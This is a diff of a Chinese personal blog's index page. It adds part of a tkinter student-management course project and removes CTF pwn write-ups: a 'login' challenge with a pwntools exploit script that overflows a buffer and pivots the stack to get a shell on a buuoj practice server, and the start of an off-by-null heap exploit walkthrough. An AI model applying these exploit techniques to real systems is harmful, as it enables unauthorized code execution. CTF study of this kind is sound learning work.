<span class="comment"># 按学号排序</span></span><br><span class="line">    students_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> sorted_students:</span><br><span class="line">        students_text += <span class="string">f&quot;学号: <span class="subst">&#123;student[<span class="string">&#x27;id&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">        students_text += <span class="string">f&quot;姓名: <span class="subst">&#123;student[<span class="string">&#x27;name&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">        students_text += <span class="string">f&quot;年龄: <span class="subst">&#123;student[<span class="string">&#x27;age&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">        students_text += <span class="string">f&quot;性别: <span class="subst">&#123;student[<span class="string">&#x27;gender&#x27;</span>]&#125;</span>\n\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> students_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_id</span>(<span class="params">student_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(student_id.strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_student</span>(<span class="params">students</span>):</span><br><span class="line">    dialog = tk.Toplevel()</span><br><span class="line">    dialog.title(<span class="string">&quot;添加学生信息&quot;</span>)</span><br><span class="line">    dialog.geometry(<span class="string">&quot;250x200+900+400&quot;</span>)</span><br><span class="line">    tk.Label(dialog, text=<span class="string">&quot;学号：&quot;</span>).grid(row=<span class="number">0</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">    id_var = tk.StringVar()</span><br><span class="line">    tk.Entry(dialog, textvariable=id_var).grid(row=<span class="number">0</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    tk.Label(dialog, text=<span class="string">&quot;姓名：&quot;</span>).grid(row=<span class="number">1</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">    name_var = tk.StringVar()</span><br><span class="line">    tk.Entry(dialog, textvariable=name_var).grid(row=<span class="number">1</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    tk.Label(dialog, text=<span class="string">&quot;年龄：&quot;</span>).grid(row=<span class="number">2</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">    age_var = tk.StringVar()</span><br><span class="line">    tk.Entry(dialog, textvariable=age_var).grid(row=<span class="number">2</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    tk.Label(dialog, text=<span class="string">&quot;性别：&quot;</span>).grid(row=<span class="number">3</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">    gender_var = tk.StringVar()</span><br><span class="line">    gender_var.<span class="built_in">set</span>(<span class="string">&quot;男&quot;</span>)</span><br><span class="line">    gender_menu = tk.OptionMenu(dialog, gender_var, <span class="string">&quot;男&quot;</span>, <span class="string">&quot;女&quot;</span>)</span><br><span class="line">    gender_menu.grid(row=<span class="number">3</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_student_action</span>():</span><br><span class="line">        student_info = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: id_var.get(),</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: name_var.get(),</span><br><span class="line">            <span class="string">&#x27;age&#x27;</span>: age_var.get(),</span><br><span class="line">            <span class="string">&#x27;gender&#x27;</span>: gender_var.get()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> student_info[<span class="string">&#x27;id&#x27;</span>] <span class="keyword">or</span> <span class="keyword">not</span> validate_id(student_info[<span class="string">&#x27;id&#x27;</span>]):</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;错误&quot;</span>, <span class="string">&quot;学号格式错误，请重新输入。&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(student[<span class="string">&#x27;id&#x27;</span>] == student_info[<span class="string">&#x27;id&#x27;</span>] <span class="keyword">for</span> student <span class="keyword">in</span> students):</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;错误&quot;</span>, <span class="string">&quot;学号已存在，请重新输入。&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        students.append(student_info)</span><br><span class="line">        messagebox.showinfo(<span class="string">&quot;成功&quot;</span>, <span class="string">&quot;学生信息添加成功！&quot;</span>)</span><br><span class="line">        dialog.destroy()</span><br><span class="line"></span><br><span class="line">    add_button = tk.Button(dialog, text=<span class="string">&quot;添加&quot;</span>, command=add_student_action)</span><br><span class="line">    add_button.grid(row=<span class="number">4</span>, columnspan=<span class="number">2</span>, pady=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_student</span>(<span class="params">students</span>):</span><br><span class="line">    student_id = simpledialog.askstring(<span class="string">&quot;输入&quot;</span>, <span class="string">&quot;请输入要编辑的学号：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> student_id <span class="keyword">or</span> <span class="keyword">not</span> validate_id(student_id):</span><br><span class="line">        messagebox.showerror(<span class="string">&quot;错误&quot;</span>, <span class="string">&quot;学号格式错误，请重新输入。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    student = <span class="built_in">next</span>((s <span class="keyword">for</span> s <span class="keyword">in</span> students <span class="keyword">if</span> s[<span class="string">&#x27;id&#x27;</span>] == student_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> student:</span><br><span class="line">        messagebox.showinfo(<span class="string">&quot;信息&quot;</span>, <span class="string">f&quot;学号: <span class="subst">&#123;student[<span class="string">&#x27;id&#x27;</span>]&#125;</span>\n姓名: <span class="subst">&#123;student[<span class="string">&#x27;name&#x27;</span>]&#125;</span>\n年龄: <span class="subst">&#123;student[<span class="string">&#x27;age&#x27;</span>]&#125;</span>\n性别: <span class="subst">&#123;student[<span class="string">&#x27;gender&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        dialog = tk.Toplevel()</span><br><span class="line">        dialog.title(<span class="string">&quot;编辑学生信息&quot;</span>)</span><br><span class="line">        dialog.geometry(<span class="string">&quot;250x200+900+400&quot;</span>)</span><br><span class="line">        tk.Label(dialog, text=<span class="string">&quot;姓名：&quot;</span>).grid(row=<span class="number">1</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">        name_var = tk.StringVar(value=student[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        tk.Entry(dialog, textvariable=name_var).grid(row=<span class="number">1</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        tk.Label(dialog, text=<span class="string">&quot;年龄：&quot;</span>).grid(row=<span class="number">2</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">        age_var = tk.StringVar(value=<span class="built_in">str</span>(student[<span class="string">&#x27;age&#x27;</span>]))</span><br><span class="line">        tk.Entry(dialog, textvariable=age_var).grid(row=<span class="number">2</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        tk.Label(dialog, text=<span class="string">&quot;性别：&quot;</span>).grid(row=<span class="number">3</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">        gender_var = tk.StringVar(value=student[<span class="string">&#x27;gender&#x27;</span>])</span><br><span class="line">        gender_menu = tk.OptionMenu(dialog, gender_var, <span class="string">&quot;男&quot;</span>, <span class="string">&quot;女&quot;</span>)</span><br><span class="line">        gender_menu.grid(row=<span class="number">3</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">edit_student_action</span>():</span><br><span class="line">            student[<span class="string">&#x27;name&#x27;</span>] = name_var.get()</span><br><span class="line">            student[<span class="string">&#x27;age&#x27;</span>] = <span class="built_in">int</span>(age_var.get())</span><br><span class="line">            student[<span class="string">&#x27;gender&#x27;</span>] = gender_var.get()</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;成功&quot;</span>, <span class="string">&quot;学生信息编辑成功！&quot;</span>)</span><br><span class="line">            dialog.destroy()</span><br><span class="line"></span><br><span class="line">        edit_button = tk.Button(dialog, text=<span class="string">&quot;编辑&quot;</span>, command=edit_student_action)</span><br><span class="line">        edit_button.grid(row=<span class="number">4</span>, columnspan=<span class="number">2</span>, pady=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showerror(<span class="string">&quot;错误&quot;</span>, <span class="string">&quot;未找到该学生信息。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_student</span>(<span class="params">students</span>):</span><br><span class="line">    student_id = simpledialog.askstring(<span class="string">&quot;输入&quot;</span>, <span class="string">&quot;请输入要删除的学号：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> student_id <span class="keyword">or</span> <span class="keyword">not</span> validate_id(student_id):</span><br><span class="line">        messagebox.showerror(<span class="string">&quot;错误&quot;</span>, <span class="string">&quot;学号格式错误，请重新输入。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    student = <span class="built_in">next</span>((s <span class="keyword">for</span> s <span class="keyword">in</span> students <span class="keyword">if</span> s[<span class="string">&#x27;id&#x27;</span>] == student_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> student:</span><br><span class="line">        students.remove(student)</span><br><span class="line">        messagebox.showinfo(<span class="string">&quot;成功&quot;</span>, <span class="string">&quot;学生信息删除成功！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showerror(<span class="string">&quot;错误&quot;</span>, <span class="string">&quot;未找到该学生信息。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    root.title(<span class="string">&quot;学生信息管理系统&quot;</span>)</span><br><span class="line"></span><br><span class="line">    students = load_students()</span><br><span class="line"></span><br><span class="line">    window_width = <span class="number">800</span></span><br><span class="line">    window_height = <span class="number">500</span></span><br><span class="line">    screen_width = root.winfo_screenwidth()</span><br><span class="line">    screen_height = root.winfo_screenheight()</span><br><span class="line"></span><br><span class="line">    x_position = (screen_width - window_width) // <span class="number">2</span></span><br><span class="line">    y_position = (screen_height - window_height) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    root.geometry(<span class="string">f&quot;<span class="subst">&#123;window_width&#125;</span>x<span class="subst">&#123;window_height&#125;</span>+<span class="subst">&#123;x_position&#125;</span>+<span class="subst">&#123;y_position&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_students_command</span>():</span><br><span class="line">        students_text = show_students(students)</span><br><span class="line">        messagebox.showinfo(<span class="string">&quot;学生信息&quot;</span>, students_text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_student_command</span>():</span><br><span class="line">        add_student(students)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete_student_command</span>():</span><br><span class="line">        delete_student(students)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edit_student_command</span>():</span><br><span class="line">        edit_student(students)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_and_exit</span>():</span><br><span class="line">        save_students(students)</span><br><span class="line">        root.destroy()</span><br><span class="line"></span><br><span class="line">    show_students_button = tk.Button(root, text=<span class="string">&quot;显示所有学生信息&quot;</span>, command=show_students_command)</span><br><span class="line">    show_students_button.pack()</span><br><span class="line"></span><br><span class="line">    add_student_button = tk.Button(root, text=<span class="string">&quot;添加学生信息&quot;</span>, command=add_student_command)</span><br><span class="line">    add_student_button.pack()</span><br><span class="line"></span><br><span class="line">    delete_student_button = tk.Button(root, text=<span class="string">&quot;删除学生信息&quot;</span>, command=delete_student_command)</span><br><span class="line">    delete_student_button.pack()</span><br><span class="line"></span><br><span class="line">    edit_student_button = tk.Button(root, text=<span class="string">&quot;编辑学生信息&quot;</span>, command=edit_student_command)</span><br><span class="line">    edit_student_button.pack()</span><br><span class="line"></span><br><span class="line">    exit_button = tk.Button(root, text=<span class="string">&quot;保存并退出&quot;</span>, command=save_and_exit)</span><br><span class="line">    exit_button.pack()</span><br><span class="line"></span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/12/25/python%E8%AF%BE%E8%AE%BE/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-sctf2019-easy-heap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -890,319 +1142,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2023/10/25/NewStar/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-login" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2023/10/23/login/" target="_blank">login</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2023/10/23/login/" class="archive-article-date">
-        <time datetime="2023-10-23T12:48:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-10-23</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h5 id="例行检查，这道题是静态的，函数多且看不懂"><a href="#例行检查，这道题是静态的，函数多且看不懂" class="headerlink" title="例行检查，这道题是静态的，函数多且看不懂"></a>例行检查，这道题是静态的，函数多且看不懂</h5><p><img src="https://i.imgs.ovh/2023/10/23/2NN33.png" alt="image-20231023205047486"></p>
-<h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.imgs.ovh/2023/10/23/2N9ae.png" alt="image-20231023204935533"></h5><h5 id="第十五行的Base64Decode函数，参数是s-用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。"><a href="#第十五行的Base64Decode函数，参数是s-用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。" class="headerlink" title="第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。"></a>第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。</h5><p><img src="https://i.imgs.ovh/2023/10/23/2aClH.png" alt="image-20231023205506057"></p>
-<h5 id="看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send-可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。"><a href="#看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send-可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。" class="headerlink" title="看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。"></a>看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。</h5><p><img src="https://i.imgs.ovh/2023/10/23/2a21s.png" alt="image-20231023210859918"></p>
-<p><img src="https://i0.imgs.ovh/2023/10/26/Fbv9I.png" alt="image-20231026202306583"></p>
-<h5 id="payload这样写"><a href="#payload这样写" class="headerlink" title="payload这样写"></a>payload这样写</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(<span class="number">0x8049284</span>)+p32(<span class="number">0x811EB40</span>)</span><br><span class="line">payload=base64.b64encode(payload)</span><br></pre></td></tr></table></figure>
-
-<h5 id="只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64-b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4-v4的大小是八字节，会覆盖到ebp-ebp是input的地址0x811EB40-然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp-esp-4，也就是调用correct函数的地址，然后提权"><a href="#只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64-b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4-v4的大小是八字节，会覆盖到ebp-ebp是input的地址0x811EB40-然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp-esp-4，也就是调用correct函数的地址，然后提权" class="headerlink" title="只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4,v4的大小是八字节，会覆盖到ebp,ebp是input的地址0x811EB40,然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp&#x3D;esp+4，也就是调用correct函数的地址，然后提权"></a>只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4,v4的大小是八字节，会覆盖到ebp,ebp是input的地址0x811EB40,然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp&#x3D;esp+4，也就是调用correct函数的地址，然后提权</h5><p><img src="https://i0.imgs.ovh/2023/10/26/Fbacj.png" alt="image-20231026205553321"></p>
-<p><img src="https://i0.imgs.ovh/2023/10/26/FoPSJ.png" alt="image-20231026204932010"></p>
-<p><img src="https://i0.imgs.ovh/2023/10/26/FoCMV.png" alt="image-20231026205315054"></p>
-<p><img src="https://i0.imgs.ovh/2023/10/26/FoVdW.png" alt="image-20231026205440817"></p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29010</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./login&quot;)</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=<span class="number">0x08049284</span></span><br><span class="line">fake_addr=<span class="number">0x811eb40</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(shell)+p32(fake_addr)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Authenticate :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2023/10/23/login/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-sctf-2019-easy-heap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2023/10/21/sctf-2019-easy-heap/" target="_blank">sctf_2019_easy_heap</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2023/10/21/sctf-2019-easy-heap/" class="archive-article-date">
-        <time datetime="2023-10-21T12:16:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-10-21</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h4 id="这道题用off-by-null解"><a href="#这道题用off-by-null解" class="headerlink" title="这道题用off by null解"></a>这道题用off by null解</h4><h5 id="例行检查，保护全开-不能利用got表，只能用hook的地址"><a href="#例行检查，保护全开-不能利用got表，只能用hook的地址" class="headerlink" title="例行检查，保护全开,不能利用got表，只能用hook的地址"></a>例行检查，保护全开,不能利用got表，只能用hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/21/2tYAH.png" alt="image-20231021201805120"></p>
-<h5 id="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"><a href="#程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。" class="headerlink" title="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"></a>程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。</h5><h5 id="mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："><a href="#mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：" class="headerlink" title="mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："></a>mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：</h5><ul>
-<li>PROT_EXEC：允许对内存映射区域进行执行访问。</li>
-<li>PROT_READ：允许对内存映射区域进行读取访问。</li>
-<li>PROT_WRITE：允许对内存映射区域进行写入访问。</li>
-<li>PROT_NONE：禁止对内存映射区域进行任何访问。</li>
-</ul>
-<h5 id="当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"><a href="#当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。" class="headerlink" title="当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7&#x3D;4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"></a>当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7&#x3D;4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。</h5><p><img src="https://i.imgs.ovh/2023/10/21/21wjI.png" alt="image-20231021203428599"></p>
-<h5 id="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"><a href="#单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数" class="headerlink" title="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"></a>单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数</h5><p><img src="https://i.imgs.ovh/2023/10/21/21fLV.png" alt="image-20231021203536497"></p>
-<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址"><a href="#按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址" class="headerlink" title="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址"></a>按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Address &#x27;</span>)</span><br><span class="line">chunk0_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/10/21/21ROU.png" alt="image-20231021212103375"></p>
-<h5 id="然后再创建四个大小不同的堆"><a href="#然后再创建四个大小不同的堆" class="headerlink" title="然后再创建四个大小不同的堆"></a>然后再创建四个大小不同的堆</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
-
